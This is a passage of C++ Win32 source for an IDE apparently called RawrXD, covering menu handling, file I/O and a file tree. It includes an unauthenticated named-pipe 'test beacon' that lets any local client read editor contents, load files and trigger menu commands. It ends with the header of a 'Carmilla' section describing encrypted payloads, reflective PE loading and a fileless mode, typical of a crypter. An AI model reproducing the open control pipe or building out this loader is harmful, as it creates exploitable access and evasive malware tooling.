        // --- View menu (missing) ---
        case IDM_VIEW_FILETREE:
            g_bFileTreeVisible = !g_bFileTreeVisible;
            CheckMenuItem(GetMenu(hwnd), IDM_VIEW_FILETREE, g_bFileTreeVisible ? MF_CHECKED : MF_UNCHECKED);
            SendMessage(hwnd, WM_SIZE, 0, 0);
            break;
        case ID_VIEW_MINIMAP:
            ToggleMinimap();
            break;
        case ID_VIEW_FOLDING:
            if (g_codeFoldingEnabled) ToggleAllFolding();
            else { InitializeCodeFolding(); g_codeFoldingEnabled = true; }
            break;
        
        // --- AI menu (missing) ---
        case IDM_AI_FIX:
            AI_FixCode();
            break;
        
        // --- Build menu (missing) ---
        case IDM_BUILD_COMPILE:
            CompileCurrentFile();
            break;
        case IDM_BUILD_DEBUG:
            DebugCurrentFile();
            break;
        case IDM_BUILD_DLLS:
            CompileMissingDLLs();
            break;
        case IDM_BUILD_CAR_ENCRYPT:
            CarmillaEncryptFile();
            break;
        case IDM_BUILD_CAR_DEPLOY:
            CarmillaDeployCar();
            break;
        
        // --- Chat menu (missing) ---
        case ID_CHAT_SEND:
            SendChatMessage();
            break;
        case ID_CHAT_START_SERVER:
            StartChatServer();
            break;
        case ID_CHAT_STOP_SERVER:
            StopChatServer();
            break;
            
        default:
            break;
        }
        break;
    }
    

    case WM_NOTIFY: {
        NMHDR* pnmh = (NMHDR*)lParam;
        if (pnmh->idFrom == IDC_FILETREE) {
            switch (pnmh->code) {
            case TVN_ITEMEXPANDINGW: {
                // Lazy-load subdirectory contents on first expand
                NMTREEVIEWW* pnmtv = (NMTREEVIEWW*)lParam;
                if (pnmtv->action == TVE_EXPAND) {
                    HTREEITEM hItem = pnmtv->itemNew.hItem;
                    // Check if already populated (first child is real or placeholder)
                    HTREEITEM hChild = (HTREEITEM)SendMessageW(g_hwndFileTree, TVM_GETNEXTITEM, TVGN_CHILD, (LPARAM)hItem);
                    if (!hChild && !g_workspaceRoot.empty()) {
                        std::wstring dirPath = GetTreeItemPath(hItem);
                        DWORD attrs = GetFileAttributesW(dirPath.c_str());
                        if (attrs != INVALID_FILE_ATTRIBUTES && (attrs & FILE_ATTRIBUTE_DIRECTORY)) {
                            PopulateFileTree(dirPath, hItem);
                        }
                    }
                }
                break;
            }
            case NM_DBLCLK: {
                // Double-click to open file in editor
                HTREEITEM hSel = (HTREEITEM)SendMessageW(g_hwndFileTree, TVM_GETNEXTITEM, TVGN_CARET, 0);
                if (hSel && !g_workspaceRoot.empty()) {
                    std::wstring filePath = GetTreeItemPath(hSel);
                    DWORD attrs = GetFileAttributesW(filePath.c_str());
                    if (attrs != INVALID_FILE_ATTRIBUTES && !(attrs & FILE_ATTRIBUTE_DIRECTORY)) {
                        LoadFile(filePath);
                    }
                }
                break;
            }
            }
        }
        break;
    }
    case WM_TEST_BEACON:
        HandleTestBeacon(hwnd, wParam, lParam);
        return 0;

    case WM_USER + 1: // Deferred syntax highlighting
        ApplySyntaxHighlighting(g_hwndEditor);
        break;
    
    case WM_DRAWITEM: {
        // Handle owner-drawn controls (e.g. minimap)
        DRAWITEMSTRUCT* pDIS = (DRAWITEMSTRUCT*)lParam;
        if (pDIS && pDIS->CtlID == IDC_MINIMAP && g_hwndMinimap) {
            // Fill minimap with dark background
            HBRUSH hBr = CreateSolidBrush(RGB(30, 30, 30));
            FillRect(pDIS->hDC, &pDIS->rcItem, hBr);
            DeleteObject(hBr);
            return TRUE;
        }
        break;
    }
        
    case WM_CLOSE: {
        // Log close reason
        FILE* flog = nullptr;
        _wfopen_s(&flog, L"rawrxd_exit.log", L"w");
        if (flog) {
            fprintf(flog, "WM_CLOSE received\n");
            fclose(flog);
        }
        // Fall through to default DefWindowProc which calls DestroyWindow
        break;
    }
    case WM_DESTROY:
        StopTestHarness();
        // Shutdown AI inference thread
        StopInferenceThread();
        
        // Cleanup HTTP client
        CleanupHTTPClient();
        
        // Cleanup chat server
        StopChatServer();

        // Cleanup terminal
        if (g_hCmdProcess) {
            TerminateProcess(g_hCmdProcess, 0);
            CloseHandle(g_hCmdProcess);
        }
        if (g_hCmdStdoutRead) CloseHandle(g_hCmdStdoutRead);
        if (g_hCmdStdinWrite) CloseHandle(g_hCmdStdinWrite);
        
        // Cleanup terminal critical section
        if (g_terminalCSInitialized) {
            DeleteCriticalSection(&g_terminalCS);
        }
        
        // Cleanup inference engine model
        if (g_modelContext) UnloadInferenceModel();
        if (g_hInferenceEngine) FreeLibrary(g_hInferenceEngine);
        
        // Cleanup model bridge
        if (g_hModelBridgeDll) FreeLibrary(g_hModelBridgeDll);
        
        if (g_hTitanDll) FreeLibrary(g_hTitanDll);
        if (g_hFontCode) DeleteObject(g_hFontCode);
        if (g_hFontUI) DeleteObject(g_hFontUI);
        PostQuitMessage(0);
        break;
        
    default:
        return DefWindowProcW(hwnd, msg, wParam, lParam);
    }
    return 0;
}

// ============================================================================
// Subclass Procedures
// ============================================================================
LRESULT CALLBACK EditorSubclassProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam, UINT_PTR uIdSubclass, DWORD_PTR dwRefData) {
    switch (msg) {
    case WM_KEYDOWN:
        if (GetKeyState(VK_CONTROL) & 0x8000) {
            switch (wParam) {
            case 'G':
                TriggerAICompletion();
                return 0;
            case 'E':
                ExplainSelectedCode();
                return 0;
            case 'R':
                RefactorSelectedCode();
                return 0;
            }
        }
        break;
    }
    return DefSubclassProc(hwnd, msg, wParam, lParam);
}

LRESULT CALLBACK ChatInputSubclassProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam, UINT_PTR uIdSubclass, DWORD_PTR dwRefData) {
    switch (msg) {
    case WM_KEYDOWN:
        if (wParam == VK_RETURN) {
            SendChatMessage();
            return 0;
        }
        break;
    }
    return DefSubclassProc(hwnd, msg, wParam, lParam);
}

// ============================================================================
// Test Harness Backend — Named Pipe Beacon Server
// Optional backend that listens on \\.\pipe\RawrXD_TestBeacon for commands.
// A test client connects, sends a command string, and receives text results.
// The pipe server runs on its own thread; commands dispatch to the UI thread
// via WM_APP messages and return results through a synchronized response buffer.
// ============================================================================


static HANDLE g_hTestPipeThread = nullptr;
static bool   g_bTestHarnessRunning = false;
static std::mutex g_testResultMutex;
static std::string g_testResultBuffer;
static HANDLE g_hTestResultReady = nullptr;  // Manual-reset event

// Beacon command IDs (sent as wParam in WM_TEST_BEACON)
enum TestBeaconCmd : UINT {
    TBC_PING            = 1,
    TBC_GET_HWND_MAP    = 2,
    TBC_GET_TREE_COUNT  = 3,
    TBC_SEND_COMMAND    = 4,   // lParam = menu command ID
    TBC_GET_TITLE       = 5,
    TBC_GET_EDITOR_TEXT = 6,
    TBC_GET_OUTPUT_TEXT = 7,
    TBC_OPEN_FOLDER     = 8,   // lParam = pointer to path string (cross-thread)
    TBC_GET_TREE_ITEMS  = 9,
    TBC_GET_VISIBILITY  = 10,
    TBC_LOAD_FILE       = 11,  // lParam = pointer to path string
    TBC_GET_WORKSPACE   = 12,
};

// Collect tree items recursively into a string
static void CollectTreeItems(HWND hTree, HTREEITEM hItem, std::string& out, int depth) {
    if (!hItem) return;
    while (hItem) {
        WCHAR buf[MAX_PATH] = {0};
        TVITEMW tvi = {};
        tvi.mask = TVIF_TEXT | TVIF_CHILDREN;
        tvi.hItem = hItem;
        tvi.pszText = buf;
        tvi.cchTextMax = MAX_PATH;
        SendMessageW(hTree, TVM_GETITEMW, 0, (LPARAM)&tvi);

        for (int i = 0; i < depth; i++) out += "  ";
        std::wstring wname(buf);
        // Convert to UTF-8
        int len = WideCharToMultiByte(CP_UTF8, 0, wname.c_str(), -1, nullptr, 0, nullptr, nullptr);
        std::string name(len - 1, 0);
        WideCharToMultiByte(CP_UTF8, 0, wname.c_str(), -1, &name[0], len, nullptr, nullptr);
        out += (tvi.cChildren ? "[D] " : "[F] ") + name + "\n";

        // Recurse into children
        HTREEITEM hChild = (HTREEITEM)SendMessageW(hTree, TVM_GETNEXTITEM, TVGN_CHILD, (LPARAM)hItem);
        if (hChild) CollectTreeItems(hTree, hChild, out, depth + 1);

        hItem = (HTREEITEM)SendMessageW(hTree, TVM_GETNEXTITEM, TVGN_NEXT, (LPARAM)hItem);
    }
}

// Handle a beacon command on the UI thread (called from WndProc WM_TEST_BEACON)
static void HandleTestBeacon(HWND hwnd, WPARAM wParam, LPARAM lParam) {
    std::string result;

    switch ((TestBeaconCmd)wParam) {
    case TBC_PING:
        result = "PONG\n";
        break;

    case TBC_GET_HWND_MAP: {
        char buf[1024];
        snprintf(buf, sizeof(buf),
            "Main=%p\nEditor=%p\nOutput=%p\nFileTree=%p\nTerminal=%p\n"
            "ChatPanel=%p\nChatInput=%p\nChatHistory=%p\nChatSend=%p\n"
            "StatusBar=%p\nIssuesPanel=%p\nIssuesList=%p\n",
            g_hwndMain, g_hwndEditor, g_hwndOutput, g_hwndFileTree,
            g_hwndTerminal, g_hwndChatPanel, g_hwndChatInput,
            g_hwndChatHistory, g_hwndChatSend, g_hwndStatusBar,
            g_hwndIssuesPanel, g_hwndIssuesList);
        result = buf;
        break;
    }

    case TBC_GET_TREE_COUNT: {
        int count = (int)SendMessageW(g_hwndFileTree, TVM_GETCOUNT, 0, 0);
        result = "TREE_COUNT=" + std::to_string(count) + "\n";
        break;
    }

    case TBC_SEND_COMMAND: {
        UINT cmdId = (UINT)lParam;
        SendMessageW(hwnd, WM_COMMAND, MAKEWPARAM(cmdId, 0), 0);
        result = "CMD_SENT=" + std::to_string(cmdId) + "\n";
        break;
    }

    case TBC_GET_TITLE: {
        WCHAR title[512]; GetWindowTextW(hwnd, title, 512);
        int len = WideCharToMultiByte(CP_UTF8, 0, title, -1, nullptr, 0, nullptr, nullptr);
        std::string t(len - 1, 0);
        WideCharToMultiByte(CP_UTF8, 0, title, -1, &t[0], len, nullptr, nullptr);
        result = "TITLE=" + t + "\n";
        break;
    }

    case TBC_GET_EDITOR_TEXT: {
        int textLen = GetWindowTextLengthW(g_hwndEditor);
        if (textLen > 0) {
            std::vector<wchar_t> buf(textLen + 1);
            GetWindowTextW(g_hwndEditor, buf.data(), textLen + 1);
            std::wstring wt(buf.data());
            int len = WideCharToMultiByte(CP_UTF8, 0, wt.c_str(), -1, nullptr, 0, nullptr, nullptr);
            result.resize(len - 1);
            WideCharToMultiByte(CP_UTF8, 0, wt.c_str(), -1, &result[0], len, nullptr, nullptr);
        }
        if (result.empty()) result = "(empty)";
        result += "\n";
        break;
    }

    case TBC_GET_OUTPUT_TEXT: {
        int textLen = GetWindowTextLengthW(g_hwndOutput);
        if (textLen > 0) {
            std::vector<wchar_t> buf(textLen + 1);
            GetWindowTextW(g_hwndOutput, buf.data(), textLen + 1);
            std::wstring wt(buf.data());
            int len = WideCharToMultiByte(CP_UTF8, 0, wt.c_str(), -1, nullptr, 0, nullptr, nullptr);
            result.resize(len - 1);
            WideCharToMultiByte(CP_UTF8, 0, wt.c_str(), -1, &result[0], len, nullptr, nullptr);
        }
        if (result.empty()) result = "(empty)";
        result += "\n";
        break;
    }

    case TBC_OPEN_FOLDER: {
        wchar_t* path = (wchar_t*)lParam;
        if (path) {
            std::wstring folder(path);
            g_workspaceRoot = folder;
            PopulateFileTree(folder);
            g_bFileTreeVisible = true;
            CheckMenuItem(GetMenu(hwnd), IDM_VIEW_FILETREE, MF_CHECKED);
            SendMessage(hwnd, WM_SIZE, 0, 0);
            std::wstring title = L"RawrXD IDE - " + folder;
            SetWindowTextW(hwnd, title.c_str());
            int count = (int)SendMessageW(g_hwndFileTree, TVM_GETCOUNT, 0, 0);
            result = "OPENED=" + std::to_string(count) + " items\n";
        } else {
            result = "ERROR=null path\n";
        }
        break;
    }

    case TBC_GET_TREE_ITEMS: {
        HTREEITEM hRoot = (HTREEITEM)SendMessageW(g_hwndFileTree, TVM_GETNEXTITEM, TVGN_ROOT, 0);
        if (hRoot) {
            CollectTreeItems(g_hwndFileTree, hRoot, result, 0);
        } else {
            result = "(empty tree)\n";
        }
        break;
    }

    case TBC_GET_VISIBILITY: {
        char buf[256];
        snprintf(buf, sizeof(buf),
            "FileTree=%d\nOutput=%d\nTerminal=%d\nChat=%d\nIssues=%d\n",
            g_bFileTreeVisible ? 1 : 0, g_bOutputVisible ? 1 : 0,
            g_bTerminalVisible ? 1 : 0, g_bChatVisible ? 1 : 0,
            g_bIssuesVisible ? 1 : 0);
        result = buf;
        break;
    }

    case TBC_LOAD_FILE: {
        wchar_t* path = (wchar_t*)lParam;
        if (path) {
            bool ok = LoadFile(std::wstring(path));
            result = ok ? "LOADED=OK\n" : "LOADED=FAIL\n";
        } else {
            result = "ERROR=null path\n";
        }
        break;
    }

    case TBC_GET_WORKSPACE: {
        if (!g_workspaceRoot.empty()) {
            int len = WideCharToMultiByte(CP_UTF8, 0, g_workspaceRoot.c_str(), -1, nullptr, 0, nullptr, nullptr);
            std::string ws(len - 1, 0);
            WideCharToMultiByte(CP_UTF8, 0, g_workspaceRoot.c_str(), -1, &ws[0], len, nullptr, nullptr);
            result = "WORKSPACE=" + ws + "\n";
        } else {
            result = "WORKSPACE=(none)\n";
        }
        break;
    }

    default:
        result = "ERROR=unknown command " + std::to_string(wParam) + "\n";
        break;
    }

    // Signal the result back to the pipe thread
    {
        std::lock_guard<std::mutex> lock(g_testResultMutex);
        g_testResultBuffer = result;
    }
    SetEvent(g_hTestResultReady);
}

// Pipe server thread — listens for connections, reads commands, dispatches, returns results
static DWORD WINAPI TestBeaconPipeThread(LPVOID) {
    while (g_bTestHarnessRunning) {
        HANDLE hPipe = CreateNamedPipeW(
            RAWRXD_PIPE_NAME,
            PIPE_ACCESS_DUPLEX,
            PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
            1,         // single instance
            65536, 65536,
            5000,      // 5s timeout
            nullptr);

        if (hPipe == INVALID_HANDLE_VALUE) {
            Sleep(1000);
            continue;
        }

        // Wait for a client to connect
        BOOL connected = ConnectNamedPipe(hPipe, nullptr) ? TRUE : (GetLastError() == ERROR_PIPE_CONNECTED);
        if (!connected) {
            CloseHandle(hPipe);
            continue;
        }

        // Client connected — read/write loop
        while (g_bTestHarnessRunning) {
            char cmdBuf[4096] = {0};
            DWORD bytesRead = 0;
            BOOL ok = ReadFile(hPipe, cmdBuf, sizeof(cmdBuf) - 1, &bytesRead, nullptr);
            if (!ok || bytesRead == 0) break;
            cmdBuf[bytesRead] = 0;

            // Parse command: "CMD [args]"
            std::string cmdStr(cmdBuf);
            // Trim trailing whitespace
            while (!cmdStr.empty() && (cmdStr.back() == '\n' || cmdStr.back() == '\r' || cmdStr.back() == ' '))
                cmdStr.pop_back();

            WPARAM wp = 0;
            LPARAM lp = 0;
            std::wstring argW;  // Keep alive until UI thread processes

            if (cmdStr == "PING") {
                wp = TBC_PING;
            } else if (cmdStr == "HWND_MAP") {
                wp = TBC_GET_HWND_MAP;
            } else if (cmdStr == "TREE_COUNT") {
                wp = TBC_GET_TREE_COUNT;
            } else if (cmdStr.rfind("CMD ", 0) == 0) {
                wp = TBC_SEND_COMMAND;
                lp = (LPARAM)atoi(cmdStr.c_str() + 4);
            } else if (cmdStr == "TITLE") {
                wp = TBC_GET_TITLE;
            } else if (cmdStr == "EDITOR_TEXT") {
                wp = TBC_GET_EDITOR_TEXT;
            } else if (cmdStr == "OUTPUT_TEXT") {
                wp = TBC_GET_OUTPUT_TEXT;
            } else if (cmdStr.rfind("OPEN_FOLDER ", 0) == 0) {
                wp = TBC_OPEN_FOLDER;
                std::string path8 = cmdStr.substr(12);
                int wlen = MultiByteToWideChar(CP_UTF8, 0, path8.c_str(), -1, nullptr, 0);
                argW.resize(wlen - 1);
                MultiByteToWideChar(CP_UTF8, 0, path8.c_str(), -1, &argW[0], wlen);
                lp = (LPARAM)argW.c_str();
            } else if (cmdStr == "TREE_ITEMS") {
                wp = TBC_GET_TREE_ITEMS;
            } else if (cmdStr == "VISIBILITY") {
                wp = TBC_GET_VISIBILITY;
            } else if (cmdStr.rfind("LOAD_FILE ", 0) == 0) {
                wp = TBC_LOAD_FILE;
                std::string path8 = cmdStr.substr(10);
                int wlen = MultiByteToWideChar(CP_UTF8, 0, path8.c_str(), -1, nullptr, 0);
                argW.resize(wlen - 1);
                MultiByteToWideChar(CP_UTF8, 0, path8.c_str(), -1, &argW[0], wlen);
                lp = (LPARAM)argW.c_str();
            } else if (cmdStr == "WORKSPACE") {
                wp = TBC_GET_WORKSPACE;
            } else if (cmdStr == "QUIT" || cmdStr == "EXIT") {
                const char* bye = "BYE\n";
                DWORD bw; WriteFile(hPipe, bye, 4, &bw, nullptr);
                FlushFileBuffers(hPipe);
                break;
            } else {
                std::string err = "ERROR=unknown: " + cmdStr + "\n";
                DWORD bw; WriteFile(hPipe, err.c_str(), (DWORD)err.size(), &bw, nullptr);
                FlushFileBuffers(hPipe);
                continue;
            }

            // Reset the event, dispatch to UI thread, wait for result
            ResetEvent(g_hTestResultReady);
            SendMessageW(g_hwndMain, WM_TEST_BEACON, wp, lp);

            // SendMessage is synchronous across threads — result is ready now
            std::string response;
            {
                std::lock_guard<std::mutex> lock(g_testResultMutex);
                response = g_testResultBuffer;
            }

            DWORD bytesWritten;
            WriteFile(hPipe, response.c_str(), (DWORD)response.size(), &bytesWritten, nullptr);
            FlushFileBuffers(hPipe);
        }

        DisconnectNamedPipe(hPipe);
        CloseHandle(hPipe);
    }
    return 0;
}

void StartTestHarness() {
    if (g_bTestHarnessRunning) return;
    g_hTestResultReady = CreateEventW(nullptr, TRUE, FALSE, nullptr);
    g_bTestHarnessRunning = true;
    g_hTestPipeThread = CreateThread(nullptr, 0, TestBeaconPipeThread, nullptr, 0, nullptr);
    AppendWindowText(g_hwndOutput, L"[TestHarness] Beacon pipe server started on \\\\.\\pipe\\RawrXD_TestBeacon\r\n");
}

void StopTestHarness() {
    if (!g_bTestHarnessRunning) return;
    g_bTestHarnessRunning = false;
    // Kick the pipe out of ConnectNamedPipe by briefly connecting
    HANDLE h = CreateFileW(RAWRXD_PIPE_NAME, GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
    if (h != INVALID_HANDLE_VALUE) CloseHandle(h);
    if (g_hTestPipeThread) { WaitForSingleObject(g_hTestPipeThread, 3000); CloseHandle(g_hTestPipeThread); g_hTestPipeThread = nullptr; }
    if (g_hTestResultReady) { CloseHandle(g_hTestResultReady); g_hTestResultReady = nullptr; }
}

// ============================================================================
// Utility Functions
// ============================================================================
std::string WideToUtf8(const std::wstring& wstr) {
    if (wstr.empty()) return std::string();
    int size_needed = WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), nullptr, 0, nullptr, nullptr);
    std::string strTo(size_needed, 0);
    WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), &strTo[0], size_needed, nullptr, nullptr);
    return strTo;
}

std::wstring Utf8ToWide(const std::string& str) {
    if (str.empty()) return std::wstring();
    int size_needed = MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), nullptr, 0);
    std::wstring wstrTo(size_needed, 0);
    MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), &wstrTo[0], size_needed);
    return wstrTo;
}

std::wstring OpenFileDialog(HWND hwnd) {
    OPENFILENAMEW ofn = { sizeof(ofn) };
    WCHAR szFile[260] = { 0 };
    ofn.lpstrFile = szFile;
    ofn.nMaxFile = sizeof(szFile);
    ofn.lpstrFilter = L"All Files\0*.*\0C/C++ Files\0*.c;*.cpp;*.h;*.hpp\0";
    ofn.Flags = OFN_PATHMUSTEXIST | OFN_FILEMUSTEXIST;
    ofn.hwndOwner = hwnd;
    
    if (GetOpenFileNameW(&ofn)) {
        return szFile;
    }
    return L"";
}

std::wstring SaveFileDialog(HWND hwnd) {
    OPENFILENAMEW ofn = { sizeof(ofn) };
    WCHAR szFile[260] = { 0 };
    ofn.lpstrFile = szFile;
    ofn.nMaxFile = sizeof(szFile);
    ofn.lpstrFilter = L"All Files\0*.*\0C/C++ Files\0*.c;*.cpp;*.h;*.hpp\0";
    ofn.Flags = OFN_OVERWRITEPROMPT;
    ofn.hwndOwner = hwnd;
    
    if (GetSaveFileNameW(&ofn)) {
        return szFile;
    }
    return L"";
}

bool LoadFile(const std::wstring& path) {
    HANDLE hFile = CreateFileW(path.c_str(), GENERIC_READ, FILE_SHARE_READ, nullptr, 
                               OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hFile == INVALID_HANDLE_VALUE) return false;
    
    DWORD size = GetFileSize(hFile, nullptr);
    std::vector<char> buffer(size + 1);
    DWORD bytesRead;
    ReadFile(hFile, buffer.data(), size, &bytesRead, nullptr);
    CloseHandle(hFile);
    
    buffer[size] = 0;
    std::string content(buffer.data());
    std::wstring wContent = Utf8ToWide(content);
    
    SetWindowTextW(g_hwndEditor, wContent.c_str());
    g_currentFile = path;
    g_isDirty = false;
    
    // Update window title
    std::wstring title = L"RawrXD IDE - " + path;
    SetWindowTextW(g_hwndMain, title.c_str());
    
    AppendWindowText(g_hwndOutput, (L"[File] Loaded: " + path + L"\r\n").c_str());
    return true;
}

bool SaveFile(const std::wstring& path) {
    HANDLE hFile = CreateFileW(path.c_str(), GENERIC_WRITE, 0, nullptr, 
                               CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hFile == INVALID_HANDLE_VALUE) return false;
    
    int len = GetWindowTextLengthW(g_hwndEditor);
    std::wstring content(len + 1, L'\0');
    GetWindowTextW(g_hwndEditor, &content[0], len + 1);
    content.resize(len);
    
    std::string utf8Content = WideToUtf8(content);
    DWORD bytesWritten;
    WriteFile(hFile, utf8Content.c_str(), (DWORD)utf8Content.size(), &bytesWritten, nullptr);
    CloseHandle(hFile);
    
    g_currentFile = path;
    g_isDirty = false;
    
    // Update window title
    std::wstring title = L"RawrXD IDE - " + path;
    SetWindowTextW(g_hwndMain, title.c_str());
    
    AppendWindowText(g_hwndOutput, (L"[File] Saved: " + path + L"\r\n").c_str());
    return true;
}

bool SaveFileAs() {
    OPENFILENAMEW ofn = { sizeof(ofn) };
    WCHAR szFile[MAX_PATH] = {0};
    ofn.hwndOwner = g_hwndMain;
    ofn.lpstrFile = szFile;
    ofn.nMaxFile = MAX_PATH;
    ofn.lpstrFilter = L"Source Files\0*.cpp;*.h;*.hpp;*.c\0All Files\0*.*\0";
    ofn.Flags = OFN_OVERWRITEPROMPT | OFN_PATHMUSTEXIST;
    if (!GetSaveFileNameW(&ofn)) return false;
    return SaveFile(szFile);
}

bool SaveFile() {
    if (g_currentFile.empty()) {
        return SaveFileAs();
    } else {
        return SaveFile(g_currentFile);
    }
}


// ============================================================================
// File Tree Implementation
// ============================================================================

std::wstring BrowseFolderDialog(HWND hwnd) {
    // Use IFileOpenDialog for modern folder picker (Vista+)
    IFileOpenDialog* pFileOpen = nullptr;
    HRESULT hr = CoCreateInstance(CLSID_FileOpenDialog, nullptr, CLSCTX_ALL,
                                  IID_IFileOpenDialog, (void**)&pFileOpen);
    if (FAILED(hr)) return L"";

    DWORD dwOptions;
    pFileOpen->GetOptions(&dwOptions);
    pFileOpen->SetOptions(dwOptions | FOS_PICKFOLDERS | FOS_FORCEFILESYSTEM);
    pFileOpen->SetTitle(L"Open Folder");

    hr = pFileOpen->Show(hwnd);
    if (FAILED(hr)) { pFileOpen->Release(); return L""; }

    IShellItem* pItem = nullptr;
    hr = pFileOpen->GetResult(&pItem);
    if (FAILED(hr)) { pFileOpen->Release(); return L""; }

    PWSTR pszPath = nullptr;
    hr = pItem->GetDisplayName(SIGDN_FILESYSPATH, &pszPath);
    std::wstring result;
    if (SUCCEEDED(hr) && pszPath) {
        result = pszPath;
        CoTaskMemFree(pszPath);
    }
    pItem->Release();
    pFileOpen->Release();
    return result;
}

std::wstring GetTreeItemPath(HTREEITEM hItem) {
    // Walk up the tree to reconstruct the full path
    std::vector<std::wstring> parts;
    HTREEITEM cur = hItem;
    while (cur) {
        WCHAR buf[MAX_PATH] = {0};
        TVITEMW tvi = {};
        tvi.mask = TVIF_TEXT;
        tvi.hItem = cur;
        tvi.pszText = buf;
        tvi.cchTextMax = MAX_PATH;
        SendMessageW(g_hwndFileTree, TVM_GETITEMW, 0, (LPARAM)&tvi);
        parts.push_back(buf);
        cur = (HTREEITEM)SendMessageW(g_hwndFileTree, TVM_GETNEXTITEM, TVGN_PARENT, (LPARAM)cur);
    }
    // Reverse and join — first part is workspace root label, replace with actual path
    if (parts.empty()) return L"";
    std::wstring path = g_workspaceRoot;
    // parts[last] = root label, skip it; parts[last-1..0] = subdirs/file
    for (int i = (int)parts.size() - 2; i >= 0; i--) {
        path += L"\\" + parts[i];
    }
    return path;
}

void PopulateFileTree(const std::wstring& rootPath, HTREEITEM hParent) {
    if (hParent == TVI_ROOT) {
        // Clear existing items
        SendMessageW(g_hwndFileTree, TVM_DELETEITEM, 0, (LPARAM)TVI_ROOT);
        // Add root node with folder name
        std::wstring folderName = rootPath;
        size_t lastSlash = folderName.find_last_of(L"\\/");
        if (lastSlash != std::wstring::npos) folderName = folderName.substr(lastSlash + 1);

        TVINSERTSTRUCTW tvins = {};
        tvins.hParent = TVI_ROOT;
        tvins.hInsertAfter = TVI_LAST;
        tvins.item.mask = TVIF_TEXT | TVIF_CHILDREN;
        tvins.item.pszText = (LPWSTR)folderName.c_str();
        tvins.item.cChildren = 1;
        HTREEITEM hRoot = (HTREEITEM)SendMessageW(g_hwndFileTree, TVM_INSERTITEMW, 0, (LPARAM)&tvins);
        PopulateFileTree(rootPath, hRoot);
        // Expand root
        SendMessageW(g_hwndFileTree, TVM_EXPAND, TVE_EXPAND, (LPARAM)hRoot);
        return;
    }

    // Enumerate directory contents — directories first, then files
    std::vector<std::wstring> dirs, files;
    WIN32_FIND_DATAW fd;
    HANDLE hFind = FindFirstFileW((rootPath + L"\\*").c_str(), &fd);
    if (hFind == INVALID_HANDLE_VALUE) return;

    do {
        std::wstring name = fd.cFileName;
        if (name == L"." || name == L"..") continue;
        // Skip hidden/system dirs and common noise
        if (name == L"node_modules" || name == L".git" || name == L"__pycache__") continue;

        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            dirs.push_back(name);
        } else {
            files.push_back(name);
        }
    } while (FindNextFileW(hFind, &fd));
    FindClose(hFind);

    // Sort alphabetically
    std::sort(dirs.begin(), dirs.end());
    std::sort(files.begin(), files.end());

    // Insert directories
    for (const auto& d : dirs) {
        TVINSERTSTRUCTW tvins = {};
        tvins.hParent = hParent;
        tvins.hInsertAfter = TVI_LAST;
        tvins.item.mask = TVIF_TEXT | TVIF_CHILDREN;
        tvins.item.pszText = (LPWSTR)d.c_str();
        tvins.item.cChildren = 1;  // Show expand arrow
        HTREEITEM hDir = (HTREEITEM)SendMessageW(g_hwndFileTree, TVM_INSERTITEMW, 0, (LPARAM)&tvins);
        // Lazy load: populate on expand via TVN_ITEMEXPANDING
    }

    // Insert files
    for (const auto& f : files) {
        TVINSERTSTRUCTW tvins = {};
        tvins.hParent = hParent;
        tvins.hInsertAfter = TVI_LAST;
        tvins.item.mask = TVIF_TEXT | TVIF_CHILDREN;
        tvins.item.pszText = (LPWSTR)f.c_str();
        tvins.item.cChildren = 0;  // No expand arrow — leaf node
        SendMessageW(g_hwndFileTree, TVM_INSERTITEMW, 0, (LPARAM)&tvins);
    }
}

void CompileCurrentFile() {
    if (g_currentFile.empty()) return;
    
    AppendWindowText(g_hwndOutput, L"[Build] Compiling...\r\n");
    
    // Basic compilation command
    std::wstring cmd = L"g++ \"" + g_currentFile + L"\" -o \"" + 
                      g_currentFile.substr(0, g_currentFile.find_last_of(L'.')) + L".exe\"";
    
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    if (CreateProcessW(nullptr, &cmd[0], nullptr, nullptr, FALSE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        DWORD exitCode;
        GetExitCodeProcess(pi.hProcess, &exitCode);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        
        if (exitCode == 0) {
            AppendWindowText(g_hwndOutput, L"[Build] Compilation successful.\r\n");
        } else {
            AppendWindowText(g_hwndOutput, L"[Build] Compilation failed.\r\n");
        }
    } else {
        AppendWindowText(g_hwndOutput, L"[Build] Failed to start compiler.\r\n");
    }
}

void RunCurrentFile() {
    if (g_currentFile.empty()) return;
    
    std::wstring exePath = g_currentFile.substr(0, g_currentFile.find_last_of(L'.')) + L".exe";
    
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    if (CreateProcessW(exePath.c_str(), nullptr, nullptr, nullptr, FALSE, 0, nullptr, nullptr, &si, &pi)) {
        AppendWindowText(g_hwndOutput, L"[Build] Running program...\r\n");
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    } else {
        AppendWindowText(g_hwndOutput, L"[Build] Failed to run program.\r\n");
    }
}

// ============================================================================
// Carmilla .car Encryption & Runtime Deployment
// ============================================================================
// Integrates the Carmilla v2.0 stub generator's encrypt mode and provides
// in-process AES-256-GCM decryption + reflective PE loading for .car files.
//
// .car container format:
//   [4]  "CCAR" magic
//   [4]  encryption flags (ENC_AES_GCM=1, ENC_DUAL=2, ENC_KEYLESS=4, ENC_FILELESS=8)
//   [4]  original file size
//   [16] IV (AES-GCM initialization vector)
//   [16] auth tag (GCM authentication tag)
//   [32] AES-256 key
//   [16] IV2 (if ENC_DUAL, second AES-CBC IV)
//   [...] encrypted payload
// ============================================================================

// .car header constants
static const DWORD CCAR_MAGIC       = 0x52414343; // "CCAR" little-endian
static const DWORD ENC_AES_GCM_FLAG = 1;
static const DWORD ENC_DUAL_FLAG    = 2;
